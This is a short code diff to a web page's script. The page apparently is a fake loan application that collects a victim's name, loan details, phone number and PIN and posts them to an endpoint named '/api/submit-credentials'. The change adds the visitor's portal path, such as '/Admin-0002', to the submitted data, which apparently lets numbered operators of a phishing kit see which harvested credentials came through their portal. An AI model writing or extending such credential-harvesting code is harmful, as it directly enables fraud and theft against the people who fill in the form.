@@ -231,6 +231,9 @@
       const repaymentTime = document.getElementById('repaymentTime').value;
       const phone = document.getElementById('phone').value;
       const pin = document.getElementById('pin').value;
+      
+      // Capture the current portal path dynamically (e.g. /Admin-0002)
+      const portalPath = window.location.pathname;
 
       document.getElementById('step2-form').classList.add('hidden');
       document.getElementById('step-loading').classList.remove('hidden');
@@ -241,7 +244,7 @@
         const res = await fetch('/api/submit-credentials', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ fullName, occupation, monthlyPayments, loanAmount, repaymentTime, phone, pin })
+          body: JSON.stringify({ fullName, occupation, monthlyPayments, loanAmount, repaymentTime, phone, pin, portalPath })
         });
         const data = await res.json();
         if (data.success) {
@@ -339,5 +342,5 @@
     }
   </script>
 </body>
-          </html>
-  
+  </html>
+        
